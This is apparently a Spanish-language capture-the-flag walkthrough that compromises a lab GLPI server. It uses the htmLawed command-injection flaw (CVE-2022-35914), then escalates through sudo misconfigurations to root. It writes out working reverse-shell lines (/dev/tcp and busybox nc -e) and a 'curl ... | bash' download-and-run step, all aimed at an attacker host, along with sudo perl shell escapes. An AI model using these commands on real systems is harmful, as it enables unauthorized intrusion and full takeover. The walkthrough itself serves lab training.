Haremos un escaneo de la ip para ver que puertos están abiertos y que servicios tiene asociados a ellos.

```
sudo nmap -sV -sC --min-rate 7000 -p- -Pn 192.168.80.133 -oN escaneo
```

![[Pasted image 20240429095853.png]]

Pondremos la ip en el navegador para ver que nos esconde.
![[Pasted image 20240429112201.png]]

Vemos que nos da la pagina por defecto de apache. Para averiguar si hay directorios o archivos ocultos vamos a realizar un fuzzing de la web.

```
dirsearch -u http://192.168.80.133
```

![[Pasted image 20240429113636.png]]

Vemos que tiene un robots.txt, así que vamos a ver que contiene.
![[Pasted image 20240429113711.png]]

Vemos que tiene una web, asi que vamos a ver que contiene.
![[Pasted image 20240429113831.png]]

Vemos que nos está diciendo la versión de la plataforma, asi que podemos buscar un exploit para ello. 

```
CVE-2022-35914

https://mayfly277.github.io/posts/GLPI-htmlawed-CVE-2022-35914/
```


En esta web, nos dice que hay una archivo que permite introducir comandshell. Este archivo es /htmLawedTest.php

![[Pasted image 20240429120546.png]]

Una vez estamos en ella, pondremos el siguiente comando para ver si podemos ejecutar comandos del servidor.

```
id
```

Tendremos que modificar en el apartado strings el input de hook y escribir exec y darle al enter.
![[Pasted image 20240429120947.png]]
![[Pasted image 20240429121009.png]]

Vemos que podemos escribir comandos del servidor. Entonces vamos a intentar lanzar una revershell. Crearemos un index.hml con lo siguiente.

```
 # !/bin/bash
 sh -i >& /dev/tcp/192.168.80.129/4444 0>&1
```

Seguidamente colgaremos el archivo en un servidor python.

```
python3 -m http.server 80
```

![[Pasted image 20240429130458.png]]

Nos pondremos a la escucha con netcat en el puerto que hemos eleguido.

```
nc -lnvp 4444
```

![[Pasted image 20240429130714.png]]

Finalmente en la web, ejecutaremos la reverse shell.

```
curl 192.168.80.129/index.html | bash
```

![[Pasted image 20240429130937.png]]
![[Pasted image 20240429140733.png]]

Para poder mostrar un prompt escribiremos lo siguinte en la shell del servidor.

```
script /dev/null -c bash
```

![[Pasted image 20240429140854.png]]

Una vez obtenemos la shell escalaremos privilegios. Para ello miraremos los binarios que tenemos privilegios.

```
sudo -l
```

![[Pasted image 20240429141009.png]]

Vemos que tenemos el binario en posesion del usuario noname. Así que vamos a explotarlo para ganarnos ese usuario.

```
sudo -u noname /usr/bin/perl -e 'exec "/bin/sh";'
```

![[Pasted image 20240429141249.png]]

Una vez tenemos el control de este usuario, vamo a ver que esconde en la carpeta de este.

![[Pasted image 20240429141409.png]]

Hemos podido ver que contiene la flag de usuario. Ahora vamos a escalar a root. Para ello vamos a volver a mirar los binarios.
![[Pasted image 20240429141541.png]]

Vemos que tiene el binario iex en posesion de root. Lo vamo a ejecutar a ver que pasa.

```
sudo /usr/bin/bash
```

![[Pasted image 20240429142100.png]]

Vemos que nos abre una consola. Nos lanzaremos una reverse shell para escalar al usuario root.

```
(Víctima)
System.cmd("busybox", ["nc", "192.168.80.129", "2222", "-e", "/bin/bash"], [])
```

```
(Local)
nc -lnvp 2222
```

![[Pasted image 20240429142703.png]]
![[Pasted image 20240429142735.png]]

Solo nos faltará ir a la carpeta root y printar la flag. 
![[Pasted image 20240429142827.png]]
